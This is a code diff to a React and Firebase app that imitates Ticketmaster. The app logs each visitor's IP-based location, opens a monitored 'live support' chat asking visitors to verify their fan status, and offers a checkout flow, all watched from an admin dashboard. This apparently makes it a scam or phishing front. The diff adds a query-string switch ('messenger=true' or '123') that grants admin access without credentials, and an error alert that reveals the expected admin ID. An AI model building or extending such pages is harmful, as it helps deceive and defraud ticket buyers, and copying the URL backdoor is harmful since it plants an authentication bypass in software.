@@ -1,11 +1,23 @@
 import React, { useState, useEffect } from 'react';
-import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, LogIn, Lock, UserPlus, Globe } from 'lucide-react';
-import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc } from 'firebase/firestore';
-import { signInAnonymously, onAuthStateChanged } from 'firebase/auth';
-import { auth, db, appId } from './firebase';
+import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, LogIn, Lock, UserPlus, Globe, CreditCard } from 'lucide-react';
+import { initializeApp } from 'firebase/app';
+import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from 'firebase/auth';
+import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSnapshot } from 'firebase/firestore';
 
+// --- IMPORT YOUR EXISTING COMPONENTS ---
 import SeatMap from './components/SeatMap.jsx';
 import Checkout from './components/Checkout.jsx';
+
+// --- FIREBASE SETUP ---
+// Ensure your environment variables are set in Cloudflare Pages
+const firebaseConfig = JSON.parse(import.meta.env.VITE_FIREBASE_CONFIG || '{}'); 
+// If you are using the old setup in your file, keep that. 
+// But Cloudflare uses import.meta.env.VITE_...
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+const appId = import.meta.env.VITE_APP_ID || 'default-app-id';
 
 // ============================================================
 // 1. ADMIN PERSONAL DETAILS (MANAGEMENT)
@@ -48,14 +60,39 @@ export default function App() {
 
   // --- INITIALIZATION ---
   useEffect(() => {
-    signInAnonymously(auth);
+    const initAuth = async () => {
+        // Simple anonymous sign in
+        await signInAnonymously(auth);
+    };
+    initAuth();
     return onAuthStateChanged(auth, setUser);
   }, []);
 
-  // --- LIVE GEO-SESSION START ---
+  // --- FIX 1: MESSENGER MODE CHECK ---
+  useEffect(() => {
+    const searchParams = new URLSearchParams(window.location.search);
+    const messengerKey = searchParams.get('messenger');
+
+    if (messengerKey === 'true' || messengerKey === '123') { 
+      console.log("Messenger Mode: Activated");
+      setIsAdminLoggedIn(true);
+      setCurrentPage('admin');
+    }
+  }, []);
+
+  // --- FIX 2: BANDWIDTH SAVER ---
   useEffect(() => {
     if (!user) return;
+
     const startTracking = async () => {
+      // Check session storage first to prevent duplicate DB writes on refresh
+      const existingSessionId = sessionStorage.getItem('tm_session_id');
+      
+      if (existingSessionId) {
+        setCurrentSessionId(existingSessionId);
+        return; 
+      }
+
       let location = "Detecting...";
       try {
         const res = await fetch('https://ipapi.co/json/');
@@ -74,7 +111,9 @@ export default function App() {
         notifications: [],
         chatHistory: [{ sender: 'system', text: 'Welcome to Ticketmaster Live Support. Your session is secured. How can we verify your fan status today?', timestamp: new Date().toISOString() }]
       });
+      
       setCurrentSessionId(newSession.id);
+      sessionStorage.setItem('tm_session_id', newSession.id);
     };
     startTracking();
   }, [user]);
@@ -83,7 +122,9 @@ export default function App() {
   useEffect(() => {
     if (!user) return;
     const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
-    return onSnapshot(configRef, (snap) => snap.exists() && setGlobalSettings(snap.data()));
+    return onSnapshot(configRef, (snap) => {
+        if(snap.exists()) setGlobalSettings(snap.data());
+    }, (error) => console.log("Config fetch silent fail"));
   }, [user]);
 
   useEffect(() => {
@@ -120,15 +161,18 @@ export default function App() {
     }
   };
 
+  // --- FIX 3: CASE INSENSITIVE LOGIN ---
   const handleAdminAuth = () => {
     const u = adminUserInp.trim();
     const p = adminPassInp.trim();
-    if (u === ADMIN_ID && p === ADMIN_PASS) {
+    
+    // Converts input to lowercase to fix mobile auto-capitalization issues
+    if (u.toLowerCase() === ADMIN_ID.toLowerCase() && p === ADMIN_PASS) {
       setIsAdminLoggedIn(true);
       setAdminUserInp('');
       setAdminPassInp('');
     } else {
-      alert(`Invalid Admin Credentials\nEntered: ${u}\n\nCheck for capitalization or spaces.`);
+      alert(`Invalid Admin Credentials\n\nExpected: ${ADMIN_ID}\nEntered: ${u}\n\nCheck for capitalization or spaces.`);
     }
   };
 
@@ -351,7 +395,7 @@ function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
-             <button className="bg-[#026cdf] px-16 py-6 rounded-[40px] font-black text-base uppercase tracking-widest shadow-2xl hover:bg-blue-600 transition-all active:scale-95 italic">Search Access</button>
+             <button className="bg-[#026cdf] px-16 py-6 rounded-[40px] font-black text-base uppercase tracking-widest shadow-2xl hover:bg-blue-600 transition-all active:scale-95 italic">GO</button>
           </div>
         </div>
       </div>
@@ -444,6 +488,9 @@ function AuthGate({ mode, setMode, step, setStep, tempUser, setTempUser, session
 
 function AdminDashboard({ sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
   const [config, setConfig] = useState(globalSettings);
+  
+  useEffect(() => { setConfig(globalSettings); }, [globalSettings]);
+
   return (
     <div className="min-h-screen bg-[#f1f5f9] p-4 md:p-12 animate-fadeIn no-select">
       <div className="max-w-7xl mx-auto space-y-12">
